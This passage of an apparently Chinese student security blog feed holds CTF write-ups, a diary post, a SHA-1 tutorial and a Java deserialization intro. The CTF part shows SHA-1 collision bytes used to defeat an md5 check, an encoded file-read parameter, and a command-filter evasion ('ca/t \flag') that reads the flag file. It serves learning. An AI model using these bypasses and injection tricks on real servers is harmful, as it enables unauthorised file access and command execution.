class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((string)$_GET[<span class="hljs-string">&#x27;a&#x27;</span>]!==(string)$_GET[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])===md5($_GET[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>    echo <span class="hljs-string">&quot;Xsw6_a&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131658.png" alt="QQ截图20220228210215"></p><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><h2 id="初步"><a href="#初步" class="headerlink" title="初步"></a>初步</h2><p>打开题目就看到url：<a href="http://8c10f0a4-759d-4e70-a624-2f513d4feada.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=">http://8c10f0a4-759d-4e70-a624-2f513d4feada.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p><p>img后面肯定是加密（F12打开就看到base64），cmd用来干什么？执行命令呗。<br>然后base64解密一下。emmm，什么玩意。两次base64解码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131468.png" alt="QQ截图20220228210724"></p><p>属实看不懂。直接查看题目给的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br></code></pre></td></tr></table></figure><p><code>hex2bin</code><strong>解码十六进制编码的二进制字符串。</strong><br>解码为555.png。</p><h2 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h2><p>很显然这里我们在看过源码之后，可以直接继续往下读。但是在真正的比赛的时候。这时候我们应该</p><p><code>$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</code></p><p>这时候我们应该将img改成index.php方向加密得到。</p><p>所用网址：</p><p><a href="https://tool.lu/hexstr/">https://tool.lu/hexstr/</a></p><p><a href="https://tool.oschina.net/encrypt?type=3">https://tool.oschina.net/encrypt?type=3</a></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">TmprMlpUWTBOalUzT<span class="hljs-number">0</span>RKbE<span class="hljs-number">56</span>QTJPRG<span class="hljs-symbol">N3</span><br></code></pre></td></tr></table></figure><p>然后F12，查看到。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282124825.png" alt="QQ截图20220228212429"></p><p>解码后看到源码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131307.png" alt="QQ截图20220228212459"></p><p>后续就是绕过MD5（非常可恶！）<br>这里还有个小tips。（源码中过滤了一些命令。）<br>可以这么构造（ca&#x2F;t \flag）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131419.png" alt="QQ截图20220228212459"></p><p>感谢<code>h3师傅、天上星师傅</code></p><p>！</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>想念宝贝</title>
    <link href="/2022/02/27/%E6%83%B3%E5%BF%B5%E5%AE%9D%E8%B4%9D/"/>
    <url>/2022/02/27/%E6%83%B3%E5%BF%B5%E5%AE%9D%E8%B4%9D/</url>
    
    <content type="html"><![CDATA[<p>每一周总结写一篇叭（争取），希望宝贝不会觉得平常学东西忘了她。虽然说是在一个学校，但是因为疫情原因隔了十万八千里。</p><p>今天还跟婆婆打电话了，婆婆身体之前一直不好，今天终于好些了。（希望早点长大，可以赚点小钱，孝敬她老人家）</p><h1 id="有点想宝贝了"><a href="#有点想宝贝了" class="headerlink" title="有点想宝贝了"></a>有点想宝贝了</h1><p>前几天计划去峨眉山玩一圈（希望到时候不会下雨）。真的就离谱订酒店的票是真的贵（499一晚）。<br>下面是计划表。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272111813.jpeg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>学生时代的恋爱</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爱情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHA-1算法</title>
    <link href="/2022/02/27/SHA-1%E7%AE%97%E6%B3%95/"/>
    <url>/2022/02/27/SHA-1%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="SHA-1算法"><a href="#SHA-1算法" class="headerlink" title="SHA-1算法"></a>SHA-1算法</h1><p><strong>SHA-1</strong>（英语：Secure Hash Algorithm 1，中文名：安全散列算法1）是一种密码散列函数。SHA-1可以生成一个被称为消息（小于2^64）摘要的160<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D">位</a>（20<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>）散列值，散列值通常的呈现形式为40个<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a>数。</p><h2 id="密码散列函数"><a href="#密码散列函数" class="headerlink" title="密码散列函数"></a>密码散列函数</h2><p><strong>密码散列函数</strong>（英语：Cryptographic hash function），又译为<strong>加密散列函数</strong>、<strong>密码散列函数</strong>、<strong>加密散列函数</strong>，是<a href="https://zh.wikipedia.org/wiki/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B8">散列函数</a>的一种。它被认为是一种<a href="https://zh.wikipedia.org/wiki/%E5%96%AE%E5%90%91%E5%87%BD%E6%95%B8">单向函数</a>，也就是说极其难以由散列函数输出的结果，回推输入的资料是什么。这样的单向函数被称为“现代密码学的驮马”。</p><h2 id="SHA-1算法实现的具体步骤"><a href="#SHA-1算法实现的具体步骤" class="headerlink" title="SHA-1算法实现的具体步骤"></a>SHA-1算法实现的具体步骤</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272048527.jpg" alt="153211996026408701"></p><h3 id="术语的概念"><a href="#术语的概念" class="headerlink" title="术语的概念"></a>术语的概念</h3><h4 id="1位-Bit-，字节（Byte）和字（Word）"><a href="#1位-Bit-，字节（Byte）和字（Word）" class="headerlink" title="1位(Bit)，字节（Byte）和字（Word）"></a>1位(Bit)，字节（Byte）和字（Word）</h4><p>SHA1始终把消息当成一个位（bit）字符串来处理。比如，字符串“abc”可以被转换成一个位字符串：<code>01100001 01100010 01100011</code>。它也可以被表示成16进制字符串: <code>0x616263</code>。</p><h4 id="运算符和符号"><a href="#运算符和符号" class="headerlink" title="运算符和符号"></a>运算符和符号</h4><p>下面的逻辑运算符都被运用于“字”（Word）</p><p>X<code>^</code>、<code>&amp;</code>Y  &#x3D; X， Y逻辑与</p><p>X <code>\/</code> Y  &#x3D; X， Y逻辑或</p><p>X <code>XOR</code> Y&#x3D; X， Y逻辑异或</p><p><code>~</code>X   &#x3D;  X逻辑取反</p><p>X<code>+</code>Y定义如下：</p><p>字 X 和 Y 代表两个整数 x 和y, 其中 0 &lt;&#x3D; x &lt; 2^32 且 0 &lt;&#x3D; y &lt; 2^32. 令整数z &#x3D; (x + y) mod 2^32. 这时候 0 &lt;&#x3D; z &lt; 2^32. 将z转换成字Z, 那么就是 Z &#x3D; X + Y.</p><p>循环左移位操作符Sn(X)。X是一个字，n是一个整数，0&lt;&#x3D;n&lt;&#x3D;32。Sn(X) &#x3D; (X&lt;&lt;n)OR(X&gt;&gt;32-n)</p><p><strong>X&lt;&lt;n定义如下</strong>：抛弃最左边的n位数字，将各个位依次向左移动n位，然后用0填补右边的n位（最后结果还是32位）。</p><p><strong>X&gt;&gt;n定义如下</strong>：X&gt;&gt;n是抛弃右边的n位，将各个位依次向右移动n位，然后在左边的n位填0。因此可以叫Sn(X)位循环移位运算</p><h3 id="将消息摘要转换成位字符串"><a href="#将消息摘要转换成位字符串" class="headerlink" title="将消息摘要转换成位字符串"></a>将消息摘要转换成位字符串</h3><p>因为在Sha-1算法中，它的输入必须为位，所以我们首先要将其转化为位字符串。我们以“abc”字符串来说明问题。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;a&#x27;=97       &#x27;b&#x27;=98       &#x27;c&#x27;=99<br>&#x27;a&#x27;=01100001 &#x27;b&#x27;=01100010 &#x27;c&#x27;=01100011<br></code></pre></td></tr></table></figure><h3 id="对转换后的位字符串进行补位操作"><a href="#对转换后的位字符串进行补位操作" class="headerlink" title="对转换后的位字符串进行补位操作"></a>对转换后的位字符串进行补位操作</h3><p>Sha-1算法标准规定，必须对消息摘要进行补位操作，即将输入的数据进行填充，使得数据长度对512求余的结果为448，填充比特位的最高位补一个1，其余的位补0，如果在补位之前已经满足对512取模余数为448，也要进行补位，在其后补一位1即可。总之，补位是至少补一位，最多补512位，我们依然以“abc”为例，其补位过程如下：</p><p>初始的信息摘要：<code>01100001 01100010 01100011</code></p><p>第一步补位：   <code>01100001 01100010 01100011 1</code>（填充位）</p><p>…..        ……</p><p>补位最后一位：  <code>01100001 01100010 01100011 10.......0</code>(后面补了423个0)</p><p>而后我们将补位操作后的信息摘要转换为十六进制，如下所示：</p><p><code>61626380 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000</code> ······</p><p>(这里值得注意的是61626380 代表的刚好是4个8位二进制数，也就是指的是<code>01100001 01100010 01100011 10000000</code>)</p><h3 id="附加长度值"><a href="#附加长度值" class="headerlink" title="附加长度值"></a>附加长度值</h3><p>在信息摘要后面附加64bit的信息，用来表示原始信息摘要的长度，在这步操作之后，信息报文便是512bit的倍数。通常来说用一个64位的数据表示原始消息的长度，如果消息长度不大于2^64，那么前32bit就为0，在进行附加长度值操作后，其“abc”数据报文即变成如下形式：</p><p><code>61626380 00000000 00000000 00000000</code>………..</p><p><code>00000000 00000000 00000000 00000000</code>…….</p><p><code>00000000 00000000 00000000 00000000</code>……………………</p><p><code>00000000 00000000 00000000 00000018</code></p><p>因为“abc”占3个字节，即24位 ，换算为十六进制即为0x18。</p><h3 id="初始化缓存"><a href="#初始化缓存" class="headerlink" title="初始化缓存"></a>初始化缓存</h3><p>一个160位MD缓冲区用以保存中间和最终散列函数的结果。它可以表示为5个32位的寄存器(H0,H1,H2,H3,H4)。初始化为：</p><p><code>H0 = 0x67452301</code></p><p><code>H1 = 0xEFCDAB89</code></p><p><code>H2 = 0x98BADCFE</code></p><p><code>H3 = 0x10325476</code></p><p><code>H4 = 0xC3D2E1F0</code></p><h3 id="计算消息摘要-分块处理"><a href="#计算消息摘要-分块处理" class="headerlink" title="计算消息摘要(分块处理)"></a>计算消息摘要(分块处理)</h3><p>在计算报文之前我们还要做一些基本的工作，就是在我们计算过程中要用到的方法，或定义。</p><p>(1)、循环左移操作符Sn(x),x是一个字，也就是32bit大小的变量，n是一个整数且0&lt;&#x3D;n&lt;&#x3D;32。Sn(X) &#x3D; (X&lt;&lt;n)OR(X&gt;&gt;32-n)</p><p>(2)、在程序中所要用到的常量，这一系列常量字k(0)、k(1)、…k(79)，将其以十六进制表示如下：</p><p><code>Kt = 0x5A827999  (0 &lt;= t &lt;= 19)</code></p><p><code>Kt = 0x6ED9EBA1 (20 &lt;= t &lt;= 39)</code></p><p><code>Kt = 0x8F1BBCDC (40 &lt;= t &lt;= 59)</code></p><p><code>Kt = 0xCA62C1D6 (60 &lt;= t &lt;= 79)</code></p><p>(3)、所要用到的一系列函数</p><p> <code>Ft(b,c,d)  ((b&amp;c)|((~b)&amp;d))   (0 &lt;= t &lt;= 19)</code></p><p> <code>Ft(b,c,d) (b^c^d)       (20 &lt;= t &lt;= 39)</code></p><p> <code>Ft(b,c,d) ((b&amp;c)|(b&amp;d)|(c&amp;d))  (40 &lt;= t &lt;= 59)</code></p><p> <code>Ft(b,c,d) (b^c^d)        (60 &lt;= t &lt;= 79)</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272045274.png"></p><h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p>必须使用进行了补位和补长度后的消息来计算消息摘要。</p><p>计算需要一个缓冲区，由5个32位的字组成，还需要一个80个32位字的缓冲区。第一个5个字的缓冲区被标识为A，B，C，D，E。80个字的缓冲区被标识为W0, W1,…, W79</p><p>另外还需要一个一个字的TEMP缓冲区。</p><p>为了产生消息摘要，在第4部分中定义的16个字的数据块M1, M2,…, Mn</p><p>会依次进行处理，处理每个数据块Mi 包含80个步骤。</p><p>现在开始处理M1, M2, … , Mn。为了处理 Mi,需要进行下面的步骤</p><ul><li><p>(1). 将 Mi 分成 16 个字 W0, W1, … , W15,  W0 是最左边的字<strong>（512bit）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272046606.gif" alt="153211992014696001"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272047733.jpeg" alt="img"></p></li><li><p>(2). 对于 t &#x3D; 16 到 79 令 Wt &#x3D; S1(Wt-3 XOR Wt-8 XOR Wt- 14 XOR Wt-16).</p></li><li><p>(3). 令 A &#x3D; H0, B &#x3D; H1, C &#x3D; H2, D &#x3D; H3, E &#x3D; H4.</p></li><li><p>(4) 对于 t &#x3D; 0 到 79，执行下面的循环</p><p>​    TEMP &#x3D; S5(A) + ft(B,C,D) + E + Wt + Kt;</p><p>​    E &#x3D; D; D &#x3D; C; C &#x3D; S30(B); B &#x3D; A; A &#x3D; TEMP;</p></li><li><p>(5). 令 H0 &#x3D; H0 + A, H1 &#x3D; H1 + B, H2 &#x3D; H2 + C, H3 &#x3D; H3 + D, H4 &#x3D; H4 + E</p><p>在处理完所有的 Mn, 后，消息摘要是一个160位的字符串，以下面的顺序标识</p><p>H0 H1 H2 H3 H4。</p></li></ul><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SHA1Context sha;<br><span class="hljs-type">int</span> i, err;<br><span class="hljs-type">uint8_t</span> Message_Digest[<span class="hljs-number">20</span>];<br><span class="hljs-comment">// testing SHA1</span><br><span class="hljs-type">char</span>  *test = <span class="hljs-string">&quot;213124314124123asdasdas&quot;</span>;<br><span class="hljs-built_in">printf</span>( <span class="hljs-string">&quot;\n测试值:\t“%s”\n&quot;</span>,test);<br>err = SHA1Reset(&amp;sha);    <span class="hljs-comment">//erro and return 0</span><br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SHA1重置错误 %d.\n&quot;</span>, err );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>err = ISD_SHA1Input(&amp;sha, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)test, <span class="hljs-built_in">strlen</span>(test));<br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SHA1输入错误 %d.\n&quot;</span>, err );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>err = ISD_SHA1Result(&amp;sha, Message_Digest);<br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>    <span class="hljs-string">&quot;SHA1结果错误 %d, 不能计算摘要值.\n&quot;</span>,<br>    err );<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;摘要值:\t&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span> ; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>, Message_Digest[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>课堂知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化</title>
    <link href="/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="为什么要有反序列化"><a href="#为什么要有反序列化" class="headerlink" title="为什么要有反序列化"></a>为什么要有反序列化</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Java序列化是指把Java对象转换为字节序列的过程(便于保存在内存、文件、数据库中)，ObjectOutputStream类的<span class="hljs-built_in">writeObject</span>()方法可以实现序列化。<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的<span class="hljs-built_in">readObject</span>()方法用于反序列化。<br></code></pre></td></tr></table></figure><p>序列化后的文件可以方便在各个平台使用windows、linux等。</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li>1.该类必须实现 java.io.Serializable 接口。</li><li>2.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li></ul><p><strong>注意点：用transient关键字修饰的属性除外，不参与序列化过程。</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">people</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Serialize&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePeople</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;people.bin&quot;</span>));<br>        <span class="hljs-type">people</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">people</span>();<br>        